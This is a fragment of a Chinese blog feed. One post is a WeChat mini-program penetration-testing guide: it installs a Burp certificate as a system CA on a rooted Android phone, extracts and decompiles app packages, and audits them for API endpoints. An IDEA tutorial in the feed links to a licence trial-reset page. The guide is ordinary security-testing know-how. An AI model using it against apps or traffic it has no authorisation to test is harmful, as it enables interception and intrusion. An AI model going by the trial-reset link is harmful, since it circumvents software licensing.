        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ol><li> <a href="#org3a5ab9e">安装Burp证书系统级证书 (&gt;=Android 7.0，需Root)</a></li><li><a href="#org40251a1">微信小程序渗透测试流程</a><ol><li> <a href="#orge937791">获取微信小程序</a></li><li> <a href="#org55f77a6">下载反编译工具 wxappUnpacker 并反编译小程序</a></li><li> <a href="#orgec829aa">代码审计，找出所有API进行测试</a></li></ol></li></ol><p><a id="org3a5ab9e"></a></p><h1 id="安装Burp证书系统级证书-gt-Android-7-0，需Root"><a href="#安装Burp证书系统级证书-gt-Android-7-0，需Root" class="headerlink" title="安装Burp证书系统级证书 (&gt;=Android 7.0，需Root)"></a>安装Burp证书系统级证书 (&gt;=Android 7.0，需Root)</h1><p>因Android 7以后，系统不再信任用户级的证书，只能信任系统级的证书，所以需要将burp证书安装到Android系统目录下</p><ol><li><p>获取Burp证书</p><ul><li><p>方法一:<br>  Burp开启代理后，浏览器访问<a href="http://burp/">http://burp</a> 证书 cacert.der</p></li><li><p>方法二:</p><p><img src="https://raw.githubusercontent.com/askDing/PicGo/main/images/20210524192845burp_ca.png" alt="img"></p></li></ul></li><li><p>证书转换</p><pre><code> openssl x509 -inform DER -in cacert.der -out cacert.pem  # 证书格式转换 der --&gt; pem openssl version    # 查看openssl版本 openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1    # 打印证书hash值 9a5ba575  openssl版本在1.0以上执行 openssl x509 -inform PEM -subject_hash -in cacert.pem    | head -1    # 打印证书hash值  openssl版本在1.0以下执行 mv cacert.pem &lt;hash&gt;.0         # 将pem格式的证书重命名为  hash值.0</code></pre></li><li><p>将证书 <code>9a5ba575.0</code> 移动到系统证书目录 <code>/system/etc/security/cacerts</code></p><pre><code> adb push 9a5ba575.0  /sdcard/    # 推送到sdcard目录上 adb shell su mv /sdcard/9a5ba575.0  /system/etc/security/cacerts/    # 将证书移到此目录 chmod 644 /system/etc/security/cacerts/9a5ba575.0       # 设置权限 adb reboot                       # 重启生效</code></pre></li></ol><p><a id="org40251a1"></a></p><h1 id="微信小程序渗透测试流程"><a href="#微信小程序渗透测试流程" class="headerlink" title="微信小程序渗透测试流程"></a>微信小程序渗透测试流程</h1><p><a id="orge937791"></a></p><h2 id="获取微信小程序"><a href="#获取微信小程序" class="headerlink" title="获取微信小程序"></a>获取微信小程序</h2><p>Android 手机最近使用过的微信小程序所对应的 <code>wxapkg</code> 包文件都存储在特定文件夹下<br>~ /data/data/com.tencent.mm/MicroMsg/{User}/appbrand/pkg/~<br><strong>{User}</strong> 为当前用户的用户名 <code>315e07770f778822*********2bfee</code></p><pre><code>adb shellsurm /data/data/com.tencent.mm/MicroMsg/&#123;User&#125;    # 先删除此目录,手机上点开待测的小程序后会重新生成此目录 原因：防止包含其他小程序cp -R /data/data/com.tencent.mm/MicroMsg/&#123;User&#125;/appbrand/pkg  /sdcard   # 将小程序目录复制到/sdcard上adb pull /sdcard/pkg  ./        # 将小程序拷贝到本地当前目录</code></pre><p><a id="org55f77a6"></a></p><h2 id="下载反编译工具-wxappUnpacker-并反编译小程序"><a href="#下载反编译工具-wxappUnpacker-并反编译小程序" class="headerlink" title="下载反编译工具 wxappUnpacker 并反编译小程序"></a>下载反编译工具 <a href="https://github.com/askDing/wxappUnpacker">wxappUnpacker</a> 并反编译小程序</h2><ol><li><p>下载反编译工具</p><pre><code> git clone git@github.com:askDing/wxappUnpacker.git cd wxappUnpacker ./install.sh -npm  # 安装npm和node ./install.sh       # 安装依赖</code></pre><ol><li><p>解包操作</p><pre><code> ./de_miniapp.sh -d  path/to/xxx.wxapkg      # 解某个小程序 ./de_miniapp.sh  /path/to/pkg               # 解pkg目录下所有的小程序</code></pre><p> <a href="https://www.wj0511.com/site/detail.html?id=357">微信小程序项目目录结构介绍</a></p><pre><code> ├── app.js              注册小程序，绑定生命周期回调函数、错误监听和页面不存在监听函数等 ├── app.json            小程序全局配置，决定页面文件的路径、窗口表现、设置网络超时时间、设置多tab等 ├── app.wxss            小程序公共样式表 ├── pages               存放小程序各个页面信息 │   │── index            │   │   ├── index.wxml  必须 页面构造类似html文件 │   │   ├── index.js    必须 对页面进行注册，指定页面的初始数据、生命周期回调、事件处理函数等 │   │   ├── index.json  页面窗口配置 │   │   └── index.wxss  页面样式表相当css文件 │   └── logs │       ├── logs.wxml │       └── logs.js └── utils               放置一些公用的方法 │        └── sitemap.json        配置小程序及其页面是否允许被微信索引 │        └── project.config.json 小程序项目配置文件 ------------------------------------------------------- ├─cloud-functions     ---云函数 │  └─setCrypto      ---数据加密模块，用户加密一些数据 │          index.js │          package.json │          ... │          ... │           ├─components      ---小程序自定义组件 │  ├─plugins      --- （重点）可独立运行的大型模块，可以打包成plugins │  │  ├─comment         ---评论模块 │  │  │  │  index.js │  │  │  │  index.json │  │  │  │  index.wxml │  │  │  │  index.wxss │  │  │  │  services.js    ---（重点）用来处理和清洗数据的service.js，配套模板和插件 │  │  │  │       │  │  │  └─submit    ---评论模块子模块：提交评论 │  │  │          index.js │  │  │          index.json │  │  │          index.wxml │  │  │          index.wxss │  │  │       │  │  └─canvasPoster     ---canvas海报生成模块 │  │          index.js │  │          index.json │  │          index.wxml │  │          index.wxss │  │          services.js    ---（重点）用来处理和清洗数据的service.js，配套模板和插件 │  │           │  └─templates   ---（重点）模板，通过外部传参的容器，不做过多的数据处理 │      │       │      ├─slideshow     ---滚屏切换模板 │      │      index.js │      │      index.json │      │      index.wxml │      │      index.wxss │      │      service.js    ---（重点）用来处理和清洗数据的service.js，配套模板和插件 │      │       │      └─works       ---作品模板 │          │  index.js │          │  index.json │          │  index.wxml │          │  index.wxss │          │  service.js │          │   │          ├─articlePlugin    ---作品模板中的文章类型 │          │      index.js │          │      index.json │          │      index.wxml │          │      index.wxss │          │       │          ├─galleryPlugin    ---作品模板中的九宫格类型 │          │      index.js │          │      index.json │          │      index.wxml │          │      index.wxss</code></pre></li></ol></li></ol><p><a id="orgec829aa"></a></p><h2 id="代码审计，找出所有API进行测试"><a href="#代码审计，找出所有API进行测试" class="headerlink" title="代码审计，找出所有API进行测试"></a>代码审计，找出所有API进行测试</h2><ol><li><p>查看 <code>xxx.json</code> 文件匹配URI(html页面）</p><pre><code> &#123;     &quot;subPackages&quot;: [         &#123;             &quot;root&quot;: &quot;pages/pageNews/&quot;,             &quot;pages&quot;: [                 &quot;pages/pageNews/news/notice/index&quot;,                 &quot;pages/pageNews/news/details&quot;,             ]         &#125;,         &#123;             &quot;root&quot;: &quot;pages/pageRetail/&quot;,             &quot;pages&quot;: [                 &quot;pages/pageRetail/companys/company/company&quot;,                 &quot;pages/pageRetail/companys/companyAdd/companyAdd&quot;,                 &quot;pages/pageRetail/lsms/fghxq&quot;             ]         &#125;,   ] &#125;</code></pre></li><li><p>查看 <code>xxx.js</code> 文件，搜索 <code>module.exports</code>,找出域名和API接口,进行测试</p><pre><code> (function (module, exports, __webpack_require__) &#123;      &quot;use strict&quot;;      var httpUrl = &#123;          //本地环境          //baseUrl:&#39;http://127.0.0.1:8001/app_name/&#39;,          //baseysts:&#39;http://127.0.0.1:8004/&#39;          //开发环境          //baseUrl:&#39;http://192.168.1.199:8001/app_name/&#39;,          //baseysts:&#39;http://192.168.1.199:8004/&#39;          //安评环境          //baseUrl:&#39;http://10.150.86.125:8001/app_name/&#39;,          //baseysts:&#39;http://10.150.86.125:8004/&#39;          //正式环境          baseUrl: &#39;https://xx.xx.xx.xx/app_name/&#39;      &#125;;      module.exports = httpUrl;      /***/  &#125;) (function (module, exports, __webpack_require__) &#123;      &quot;use strict&quot;;      //const base = &quot;http://192.168.1.199:7120/&quot;      var bases = __webpack_require__(/*! ./https */ &quot;./src/config/https.js&quot;);      var base = bases.baseUrl;      var baseyst = bases.baseysts;      module.exports = &#123;          newsLists: base + &#39;appnews/news/list&#39;, //资讯列表          newsDetails: base + &#39;appnews/news/detail&#39;,          tbsbqr: base + &#39;appsbs/refund/tbsbqr&#39;,           queren: base + &#39;appsbs/refund/queren&#39;,           ....          gang_dong_geo: base + &#39;appbase/static/js/gang_dong_geo.json&#39; //地图json      &#125;;  &#125;)</code></pre></li></ol><p>References:</p><ul><li>  <a href="https://developers.weixin.qq.com/miniprogram/dev/framework/quickstart/">小程序开发官方文档</a></li><li>  <a href="http://www.hcoder.net/books/read/info/1181.html">微信小程序开发指南</a></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Evolution </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何在AWS上部署kali</title>
      <link href="Tools/%E5%A6%82%E4%BD%95%E5%9C%A8AWS%E4%B8%8A%E9%83%A8%E7%BD%B2kali.html"/>
      <url>Tools/%E5%A6%82%E4%BD%95%E5%9C%A8AWS%E4%B8%8A%E9%83%A8%E7%BD%B2kali.html</url>
      
        <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none"></div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IDEA使用教程</title>
      <link href="Coding/IDEA%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.html"/>
      <url>Coding/IDEA%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B.html</url>
      
        <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="IntelJ-Idea"><a href="#IntelJ-Idea" class="headerlink" title="IntelJ Idea"></a>IntelJ Idea</h1><p>教程 <a href="https://github.com/judasn/IntelliJ-IDEA-Tutorial">https://github.com/judasn/IntelliJ-IDEA-Tutorial</a></p><pre><code class="bash">brew install --cask intellij-idea</code></pre><h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a><a href="https://www.digit77.com/skills/jetbrains-family-of-products-reset-trial/">激活</a></h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227132127.png"><br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227132201.png"></p><h2 id="Settings-Import-Export"><a href="#Settings-Import-Export" class="headerlink" title="Settings Import/Export"></a>Settings Import/Export</h2><ul><li>导出配置 <img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227150440.png"></li></ul><h1 id="IDEA-偏好设置"><a href="#IDEA-偏好设置" class="headerlink" title="IDEA 偏好设置"></a>IDEA <a href="https://mp.weixin.qq.com/s/qEnw1ZoprGmE1iP6zvv85w">偏好设置</a></h1><p>全局配置打开偏好设置<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227142833.png"></p><h2 id="Appearance-amp-Behavior"><a href="#Appearance-amp-Behavior" class="headerlink" title="Appearance &amp; Behavior"></a><a href="https://www.cxymm.net/article/qq_37242720/119349394">Appearance &amp; Behavior</a></h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227112327.png"></p><h3 id="System-Settings"><a href="#System-Settings" class="headerlink" title="System Settings"></a>System Settings</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227181318.png"></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227111947.png"></p><h2 id="Keymap"><a href="#Keymap" class="headerlink" title="Keymap"></a>Keymap</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227181652.png"><br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227144310.png"></p><h3 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a><a href="https://mp.weixin.qq.com/s/qFuAQH8UBxQPVOTV8atICQ">常用快捷键</a></h3><table><thead><tr><th>Ctrl+h</th><th>查看当前类的层次结构</th><th></th></tr></thead><tbody><tr><td>Command+7</td><td>查看类结构</td><td></td></tr><tr><td>Command+O</td><td>快速搜索类</td><td></td></tr><tr><td>Command +F</td><td>关键字检索(当前文件)</td><td>全局 Command+Shift+F</td></tr><tr><td>Command+Alt +B</td><td>查看方法/类的实现类</td><td></td></tr><tr><td>Alt + F7</td><td>查看调用链(方法被调用的情况)</td><td>Find Usages</td></tr><tr><td>Command+E</td><td>查看最近使用的文件</td><td></td></tr><tr><td>Shift+ Alt+Command+U</td><td>查看可视化类继承链</td><td></td></tr><tr><td>Command+/</td><td>行注释</td><td>Shift+Command+/  块注释</td></tr><tr><td>/**</td><td>方法/类注释</td><td>可自定义类模板</td></tr></tbody></table><p>可视化类继承链<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227160151.png"></p><h2 id="Editor"><a href="#Editor" class="headerlink" title="Editor"></a>Editor</h2><h3 id="Editor-gt-General"><a href="#Editor-gt-General" class="headerlink" title="Editor-&gt;General"></a>Editor-&gt;General</h3><ol><li><p>自动导入<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227120933.png"></p></li><li><p>Appearnace</p></li></ol><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227121257.png"></p><ol start="3"><li>Code Completion</li></ol><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227121555.png"></p><ol start="4"><li>Editor Tabs</li></ol><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227121841.png"><br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220206192547.png"></p><h4 id="Postfix-Completion"><a href="#Postfix-Completion" class="headerlink" title="Postfix Completion"></a><a href="https://mp.weixin.qq.com/s?__biz=MzUyMzM2ODUwMA==&mid=2247492923&idx=1&sn=e52afa95777cbccbb584aad842d1a22c&chksm=fa3f0460cd488d76420858c663953776765cab8ce04561a825494e813096703d40f89dbbc5db&scene=178&cur_album_id=1909669645461061636#rd">Postfix Completion</a></h4><h5 id="var声明"><a href="#var声明" class="headerlink" title="var声明"></a>var声明</h5><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/6mychickmupWyfMiax0ryO6Hs4SYOv1IzQdjcSJMicwQYJQs8bTHEC1zOCd6Jkr36fxNyC78jlvp9Odf2e4vsz1yw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1"></p><h5 id="null判空"><a href="#null判空" class="headerlink" title="null判空"></a>null判空</h5><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLGibPt6pn8saKdYrj2oy8FZMcKIXiaSiajAJWIYibk9ibXe7cH2NkzceukMqjWcCENZ7jceHU5Wjhqaw5g/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h5 id="notnull判非空"><a href="#notnull判非空" class="headerlink" title="notnull判非空"></a>notnull判非空</h5><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLGibPt6pn8saKdYrj2oy8FZM6l4tCztov1I8aBj4Itpjgibp0MiaLae7YZvGpQ2cYbvMCOsFGQvrYj0A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h5 id="nn判非空"><a href="#nn判非空" class="headerlink" title="nn判非空"></a>nn判非空</h5><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLGibPt6pn8saKdYrj2oy8FZMoNOv2U8f55H037mj52harqvkjhZKC8890vUV0NPqvlFRhgfH8Gs8jw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h5 id="for遍历"><a href="#for遍历" class="headerlink" title="for遍历"></a>for遍历</h5><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLGibPt6pn8saKdYrj2oy8FZMuSA6LYat1ic9Q0FbgMJnPSc6OuGIuPyiazb211nWHpNCehQRBVsyIzqQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h5 id="fori带索引的遍历"><a href="#fori带索引的遍历" class="headerlink" title="fori带索引的遍历"></a>fori带索引的遍历</h5><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/6mychickmupWyfMiax0ryO6Hs4SYOv1IzQdd7icPx2AmhkjzppPdpYNe3bZ5KicaGuWd8kE9vKmP7oSb6Jicj25RY5w/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1"></p><h5 id="not取反"><a href="#not取反" class="headerlink" title="not取反"></a>not取反</h5><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/6mychickmupWyfMiax0ryO6Hs4SYOv1IzQd6ZV6iaCS8dGeLt467yT4bws21Z4vVYjnz95wk4f35eQVVuwF30SZ6Q/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1"></p><h5 id="if条件判断"><a href="#if条件判断" class="headerlink" title="if条件判断"></a>if条件判断</h5><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLGibPt6pn8saKdYrj2oy8FZMnnNuhiaco3oVEWxanVIUo5T1UUw8StFtIFCDVIg8b5x7yiaTXl4O17Uw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h5 id="cast强转"><a href="#cast强转" class="headerlink" title="cast强转"></a>cast强转</h5><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/knmrNHnmCLGibPt6pn8saKdYrj2oy8FZMQ0U1hCpF8Vwjn293YoODjs1fkbGtZ23VTKSY8yzpTKp99M5uW2MDIA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h5 id="return返回值"><a href="#return返回值" class="headerlink" title="return返回值"></a>return返回值</h5><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/6mychickmupWyfMiax0ryO6Hs4SYOv1IzQ0y2u4vU6p2gBuFQSfxYuqlaB7HJGnlBEUXW0QfLKKSl5FTzvXAdQHg/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1"></p><h3 id="Editro-gt-Code-Editing"><a href="#Editro-gt-Code-Editing" class="headerlink" title="Editro-&gt;Code Editing"></a>Editro-&gt;Code Editing</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227122143.png"></p><h3 id="Font"><a href="#Font" class="headerlink" title="Font"></a>Font</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227122258.png"></p><h3 id="Color-Scheme"><a href="#Color-Scheme" class="headerlink" title="Color Scheme"></a>Color Scheme</h3><h3 id="Code-Style"><a href="#Code-Style" class="headerlink" title="Code Style"></a>Code Style</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227180859.png"></p><h3 id="Inspections"><a href="#Inspections" class="headerlink" title="Inspections"></a>Inspections</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227122840.png"></p><h3 id="File-and-Code-Templates"><a href="#File-and-Code-Templates" class="headerlink" title="File and Code Templates"></a>File and Code Templates</h3><ul><li>File Header</li></ul><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227124637.png"></p><ul><li><p>Class<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220107203714.png"></p></li><li><p>Interface</p></li></ul><ul><li>Enum</li></ul><h3 id="File-Encodings"><a href="#File-Encodings" class="headerlink" title="File Encodings"></a>File Encodings</h3><p>BOM（byte-order mark），即字节顺序标记，它是插入到以UTF-8、UTF16或UTF-32编码Unicode文件开s头的特殊标记，用来识别Unicode文件的编码类型。对于UTF-8来说，BOM并不是必须的，因为BOM用来标记多字节编码文件的编码类型和字节顺序（big-endian或little-endian）。</p><p>　　不含BOM的UTF-8才是标准形式，UTF-8不需要BOM<br>　　带BOM的UTF-8文件的开头会有U+FEFF，所以我新建的空文件会有3字节的大小。</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211224114425.png"></p><h3 id="Live-Templates"><a href="#Live-Templates" class="headerlink" title="Live Templates"></a>Live Templates</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220107204808.png"></p><h3 id="File-Types"><a href="#File-Types" class="headerlink" title="File Types"></a>File Types</h3><p>隐藏项目中 <code>.idea</code>目录<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220206190631.png"></p><h3 id="Inlay-Hints-Java"><a href="#Inlay-Hints-Java" class="headerlink" title="Inlay Hints -Java"></a>Inlay Hints -Java</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227125319.png"></p><h3 id="Copyright"><a href="#Copyright" class="headerlink" title="Copyright"></a>Copyright</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220103191410.png"></p><h2 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a><a href="https://mp.weixin.qq.com/s/pM87uedBdcwd2L9D9gGjBA">Plugins</a></h2><h3 id="常用插件"><a href="#常用插件" class="headerlink" title="常用插件"></a>常用插件</h3><h4 id="Theme-Nord-One-Dark-Xcode-Dark"><a href="#Theme-Nord-One-Dark-Xcode-Dark" class="headerlink" title="Theme - Nord / One Dark / Xcode-Dark"></a><a href="https://mp.weixin.qq.com/s?__biz=MzUyMzM2ODUwMA==&mid=2247492901&idx=2&sn=e9c77d0fe12e88fc8fdf054b34732366&chksm=fa3f047ecd488d683dcc33df9a81c73dd6e5a336b8b4d1c4908090c4938433e867bc17bd3e1c&scene=178&cur_album_id=1909669645461061636#rd">Theme </a>- Nord / One Dark / Xcode-Dark</h4><h4 id="Dash"><a href="#Dash" class="headerlink" title="Dash"></a>Dash</h4><h4 id="Edutool"><a href="#Edutool" class="headerlink" title="Edutool"></a>Edutool</h4><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220104215621.png"></p><h4 id="Stackoverflow"><a href="#Stackoverflow" class="headerlink" title="Stackoverflow"></a>Stackoverflow</h4><h4 id="时序图-SequenceDigram"><a href="#时序图-SequenceDigram" class="headerlink" title="时序图-SequenceDigram"></a>时序图-SequenceDigram</h4><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227161338.png"></p><h4 id="项目代码统计-Statistic"><a href="#项目代码统计-Statistic" class="headerlink" title="项目代码统计 Statistic"></a>项目代码统计 Statistic</h4><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211227161734.png"></p><h4 id="快捷键展示Presentation-Assistant"><a href="#快捷键展示Presentation-Assistant" class="headerlink" title="快捷键展示Presentation Assistant"></a>快捷键展示Presentation Assistant</h4><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/eQPyBffYbucDB7I8nDz0WVxAlXgVuniakBgsgLZPl3maGdf8a62zoYQ3vTZMvu2Py1avbCGCuwibeJ7PBrBn8iccA/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1"><br><img src="https://mmbiz.qpic.cn/mmbiz_png/eQPyBffYbucDB7I8nDz0WVxAlXgVuniakiaPz4h5OwibzR6XIO4n2cQme76lXibZEpjibnmegVSFNU77ibsEKtic2VZCg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h4 id="阿里巴巴-Java-代码规范-Alibaba-Java-Code-Guidelines"><a href="#阿里巴巴-Java-代码规范-Alibaba-Java-Code-Guidelines" class="headerlink" title="阿里巴巴 Java 代码规范- Alibaba Java Code Guidelines"></a>阿里巴巴 Java 代码规范- Alibaba Java Code Guidelines</h4><p><img src="https://mmbiz.qpic.cn/mmbiz_png/eQPyBffYbucDB7I8nDz0WVxAlXgVuniakiaPz4h5OwibzR6XIO4n2cQme76lXibZEpjibnmegVSFNU77ibsEKtic2VZCg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h4 id="MybatisX-高效操作Mybatis插件"><a href="#MybatisX-高效操作Mybatis插件" class="headerlink" title="MybatisX 高效操作Mybatis插件"></a>MybatisX 高效操作Mybatis插件</h4><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220105150901.png"></p><h4 id="Mybatis-log-plugin"><a href="#Mybatis-log-plugin" class="headerlink" title="Mybatis-log-plugin"></a>Mybatis-log-plugin</h4><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220207120910.png"></p><h4 id="Codota—-代码智能提示"><a href="#Codota—-代码智能提示" class="headerlink" title="Codota— 代码智能提示"></a>Codota— 代码智能提示</h4><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/eQPyBffYbucDB7I8nDz0WVxAlXgVuniakSXaQcGmbeX7lEiagsB77fuAgwGRevqNpsdE7xiaGzQILQOYekOc4oCGQ/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1"></p><h4 id="必备的翻译插件-Translation"><a href="#必备的翻译插件-Translation" class="headerlink" title="必备的翻译插件-Translation"></a>必备的翻译插件-Translation</h4><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/eQPyBffYbucDB7I8nDz0WVxAlXgVuniakmYCroPAnOiaaIPozjPBO4pIPqxibLT5cdYQMS6CFibV0t274w68KpgGEg/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1"></p><h4 id="GitToolBox-显示代码提交时间"><a href="#GitToolBox-显示代码提交时间" class="headerlink" title="GitToolBox-显示代码提交时间"></a>GitToolBox-显示代码提交时间</h4><p><img src="https://mmbiz.qpic.cn/mmbiz_png/YbBNmAxYwZKtUbMyD6jfjjTguoBwwHPzKDUaW4Dv5PxwDiayEy9cGVFQaiabiaQEchozF7L7PoiaoeFvboTjv7aHaw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h4 id="Key-Promoter-X-快捷键提示插件"><a href="#Key-Promoter-X-快捷键提示插件" class="headerlink" title="Key Promoter X 快捷键提示插件"></a>Key Promoter X 快捷键提示插件</h4><p><img src="https://mmbiz.qpic.cn/mmbiz_png/WpLd6CGLSOcjAegECzd4bQdYmUR3YD9rT9Eeerbj7BJ5V6nOXQelRicRB1lLutibuQn7LDVezhnjLWDlNsmro1gA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h4 id="Rainbow-Brackets-——让你的括号变成不一样的颜色，防止错乱括号"><a href="#Rainbow-Brackets-——让你的括号变成不一样的颜色，防止错乱括号" class="headerlink" title="Rainbow Brackets ——让你的括号变成不一样的颜色，防止错乱括号"></a>Rainbow Brackets ——让你的括号变成不一样的颜色，防止错乱括号</h4><p><img src="https://mmbiz.qpic.cn/mmbiz_png/eQPyBffYbucDB7I8nDz0WVxAlXgVuniak1YXXhjwEpUdwRMk7TQ74E5RKHoRQLIHktdK6RH7wngAB2P2ia2ia9ODA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><h4 id="Leetcode-Editor-可以在IDEA中在线刷题。"><a href="#Leetcode-Editor-可以在IDEA中在线刷题。" class="headerlink" title="Leetcode Editor 可以在IDEA中在线刷题。"></a>Leetcode Editor 可以在IDEA中在线刷题。</h4><p><img src="https://mmbiz.qpic.cn/mmbiz_gif/eQPyBffYbucDB7I8nDz0WVxAlXgVuniakhfa6UVfAab15vkX7VT51CkDO6m0a9EcaqhpnR9g7RLJpsPJUAaqyjw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1"></p><h4 id="Java-Stream-Debugger-——-Stream-将操作步骤可视化"><a href="#Java-Stream-Debugger-——-Stream-将操作步骤可视化" class="headerlink" title="Java Stream Debugger —— Stream 将操作步骤可视化"></a>Java Stream Debugger —— Stream 将操作步骤可视化</h4><p><img 